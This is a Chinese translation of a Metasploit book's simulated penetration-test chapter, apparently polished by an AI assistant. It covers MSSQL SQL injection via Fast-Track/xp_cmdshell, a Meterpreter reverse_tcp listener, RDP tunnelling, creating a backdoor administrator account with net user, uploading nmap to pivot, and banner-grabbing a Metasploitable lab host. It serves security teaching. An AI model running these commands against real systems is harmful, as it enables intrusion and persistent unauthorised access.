### 信息优化

错误信息显示目标Web应用程序存在SQL注入漏洞，因为输入'TEST'后出现了“Incorrect syntax near”这样的SQL异常错误。通过快速的Google查询并结合看到的错误消息，可以确定后台数据库是MSSQL。

在此章节中，我们不会深入探讨如何对Web应用执行SQL注入攻击的具体步骤。实际上，你可以通过操纵输入参数来轻易地攻击一个存在SQL注入漏洞的系统，并最终完全攻陷它（这部分内容已在第11章中简要介绍）。需要注意的是，到目前为止，我们还没有真正对目标系统进行攻击，只是进行了简单的测试。接下来，我们将进入更加激动人心的渗透测试阶段。

---

### 第17章 一次模拟的渗透测试过程

#### 17.4 渗透攻击
在搜索Web应用程序中的漏洞时，我们发现了一个关键的攻击通道，即可以通过SQL注入进行攻击。在这种情况下，使用Fast-Track工具来攻陷MSSQL服务并在目标系统上植入Meterpreter是最优选择。正如你在第11章中已经经历过的那样，Fast-Track工具能够轻松处理MSSQL上的注入漏洞。

一旦获得Meterpreter终端，我们就可以进一步探索如何通过内网获取Metasploitable系统的访问权限。

#### 17.5 MSF终端中的渗透攻击过程
我们将使用SQLPwnage通过SQL注入植入Meterpreter终端，以取得目标系统后台数据库的管理员访问权限。在第11章中已介绍了SQLPwnage是一种自动化攻击MSSQL注入漏洞的方法，它利用多种技术手段，特别是xp_cmdshell存储过程，来完全攻陷一台SQL服务器。

在开始攻击之前，我们需要在MSF终端中设置一些配置选项。为了实践更多技术流程，我们将手动创建自己的Metasploit监听器，尽管Fast-Track可以自动完成这项工作。此外，我们还将在Metasploit中通过`auto_add_route`函数，在内部网络中自动连接目标系统。创建好监听器之后，启动Fast-Track来攻击目标系统。

```bash
root@bt:/opt/framework3/msf3# msfconsole
msf > use multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 172.16.32.129
LHOST => 172.16.32.129
msf exploit(handler) > set LPORT 443
LPORT => 443
msf exploit(handler) > load auto_add_route
[*] Successfully loaded plugin: auto_add_route
msf exploit(handler) > exploit -j
[*] Exploit running as background job.
[*] Started reverse handler on 172.16.32.129:443
[*] Starting the payload handler...
```

我们的监听器正在等待即将被攻陷的目标系统连接时，按照如下方式运行Fast-Track。（当xterm窗口打开时，立即关闭它，因为我们已经设置好了监听器）

```bash
[+] Importing 64kb debug bypass payload into Fast-Track... [+] 
[+] Import complete, formatting the payload for delivery.. [+] 
[+] Payload Formatting prepped and ready for launch. [+] 
[+] Executing SQL commands to elevate account permissions. [+] 
[+] Initiating stored procedure: 'xp_cmdshell' if disabled. [+] 
[+] Delivery Complete. [+] 
Launching MSFCLI Meterpreter Handler
Creating Metasploit Reverse Meterpreter Payload..
Created by msfpayload (http://www.metasploit.com).
Payload: windows/meterpreter/reverse_tcp
Length: 290
Options: LHOST=172.16.32.129, LPORT=443
Taking raw binary and converting to hex.
Raw binary converted to straight hex.
[+] Bypassing Windows Debug 64kB Restrictions. Evil. [+] 
[+] Sending chunked payload. Number 1 of 9. This may take a bit. [+] 
[+] Conversion from hex to binary in progress. [+] 
[+] Conversion complete. Moving the binary to an executable. [+] 
[+] Splitting the hex into 100 character chunks [+] 
[+] Split complete. [+] 
[+] Prepping the payload for delivery. [+] 
Sending chunk 1 of 8, this may take a bit..
Sending chunk 2 of 8, this may take a bit..
Using H2B Bypass to convert our Payload to Binary..
Running cleanup before launching the payload....
[+] Launching the PAYLOAD!! This may take up to two or three minutes. [+] 
```

这应该看起来很熟悉，因为我们已经通过Fast-Track攻击了目标系统上的Web应用程序，并利用SQL注入漏洞攻陷了主机。我们使用xp_cmdshell存储过程和二进制到十六进制的转换技术完成了全功能Meterpreter Shell的植入。

#### 17.6 后渗透攻击
此时，我们应该已经在MSF终端后台中取得了Meterpreter控制终端。现在可以开始扫描目标系统所连接的内部子网，以发现其他活跃的系统。为此，我们将向受控目标主机上传nmap，并在这台Windows靶机上运行它。

首先，从insecure.org网站下载nmap的二进制可执行文件并保存在本地。然后将其上传至目标系统。接下来，通过微软的RDP协议连接目标系统的远程桌面。RDP是Windows系统内置支持的一个远程管理协议，允许你与Windows桌面进行交互，就像坐在远程机器前一样。当我们连接到Meterpreter终端会话后，可以使用Meterpreter的`getgui`脚本将RDP协议通过隧道绑定在我们机器上的8080端口，然后在目标系统上添加一个新的管理员用户。

在BackTrack攻击机的命令行上输入`rdesktop localhost:8080`，就可以使用新创建的用户账号登录到目标系统上。接下来使用Meterpreter上传nmap到目标系统上，目的是在攻陷的Windows靶机上安装nmap，然后使用这台系统作为跳板进行进一步的内网拓展。或者，你也可以直接通过Metasploit使用集成的`scanner/portscan/syn`和`scanner/portscan/tcp`模块进行扫描，具体取决于你的需求。

```bash
meterpreter > run getgui -e -f 8080
[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
[*] Carlos Perez PI:EMAIL
[*] Enabling Remote Desktop
[*] RDP is already enabled
[*] Setting Terminal Services service startup mode
[*] Terminal Services service is already set to auto
[*] Opening port in local firewall if necessary
[*] Starting the port forwarding at local port 8080
[*] Local TCP relay created: 0.0.0.0:8080 -> 127.0.0.1:3389
meterpreter > shell
Process 2480 created.
Channel 6 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\WINDOWS\system32> net user msf metasploit /add
The command completed successfully.
C:\WINDOWS\system32> net localgroup administrators msf /add
The command completed successfully.
C:\WINDOWS\system32>
C:\WINDOWS\system32> ^Z
Background channel 6? [y/N]  y
meterpreter > upload nmap.exe
[*] uploading : nmap.exe -> nmap.exe
```

现在已经准备好进行进一步的攻击了。通过在目标系统上安装nmap，我们相当于已经进入了目标内部网络。现在可以尝试查找出内部连接的系统，并进一步渗透内部网络。

##### 17.6.1 扫描Metasploitable靶机
通过Meterpreter会话并通过装载`auto_add_route`命令，我们取得了内部网络的访问通道。我们可以使用攻陷的Windows XP靶机作为跳板，来扫描和攻击内部网络主机。由于已经有效地连入了内部网络，我们可以直接访问Metasploitable靶机目标。让我们首先开始一个基本的端口扫描。

```bash
nmap.exe -sT -A -P0 172.16.32.162
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     ProFTPD 1.3.1
|_ftp-bounce: no banner
22/tcp   open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_ 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp   open  telnet  Linux telnetd
25/tcp   open  smtp    Postfix smtpd
53/tcp   open  domain  ISC BIND 9.4.2
80/tcp   open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)
|_html-title: Site doesn't have a title (text/html)
139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
3306/tcp open  mysql   MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql PostgreSQL DB
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8180/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_html-title: Apache Tomcat/5.5
|_http-favicon: Apache Tomcat
MAC Address: 00:0C:29:39:12:B2 (VMware)
Network Distance: 1 hop
Service Info: Host: metasploitable.localdomain; OSs: Unix, Linux
Host script results:
| nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown>
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Name: WORKGROUP\Unknown
|   System time: 2010-05-21 22:28:01 UTC-4
Nmap done: 1 IP address (1 host up) scanned in 60.19 seconds
```

这里可以看到很多端口是开放的。基于nmap的操作系统辨识能力，我们看到扫描的目标系统是一类Unix/Linux系统的变种。其中一些开放的端口，如FTP、Telnet、HTTP、SSH、Samba、MySQL、PostgresSQL和Apache等应该会引起你的兴趣。

##### 17.6.2 识别存有漏洞的服务
由于对一些端口非常感兴趣，所以我们首先开始进行旗标抓取，以尝试寻找进入系统的方法：

```bash
msf > use auxiliary/scanner/ftp/ftp_version
msf auxiliary(ftp_version) > set RHOSTS 172.16.32.162
RHOSTS => 172.16.32.162
msf auxiliary(ftp_version) > run
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ftp_version) >
```

通过对FTP服务的查点，我们看到ProFTPD 1.3.1运行在21端口上。接下来使用SSH了解更多关于目标系统的信息（额外的-v标志位让我们得到一些调试信息输出），下面的输出结果显示告诉我们目标系统运行着一个老旧版本的OpenSSH，并是专门为Ubuntu系统所编写的。

```bash
msf > ssh 172.16.32.162 -V
[*] exec: ssh 172.16.32.162 -v
OpenSSH_5.1p1 Debian-3ubuntu1, OpenSSL 0.9.8g 19 Oct 2007
```

现在我们运行如下指令，来确定目标系统到底运行的是什么版本的Ubuntu。

```bash
msf auxiliary(telnet_version) > set RHOSTS 172.16.32.162
RHOSTS => 172.16.32.162
msf auxiliary(telnet_version) > run
[*] 172.16.32.162:23 TELNET Ubuntu 8.04\x0a metasploitable login:
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(telnet_version) >
```

太棒了！我们已经知道了目标系统运行着Ubuntu 8.04，以及使用了两个未经加密的协议（telnet和FTP），以后可能会来玩玩它们。

现在让我们看看SMTP，确定下在目标系统上运行着哪个电子邮件服务。记住我们是在探测远程目标服务器上运行的哪些版本的网络服务。

```bash
msf > use auxiliary/scanner/smtp/smtp_version
msf auxiliary(smtp_version) > set RHOSTS 172.16.32.162
RHOSTS => 172.16.32.162
msf auxiliary(smtp_version) > run
[*] 172.16.32.162:25 SMTP 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)\x0d\x0a
[*] Scanned 1 of 1 hosts (100% complete)
```

---

希望这些优化后的文本能更好地帮助你理解和操作。如果有任何进一步的问题或需要更多的细节，请告诉我！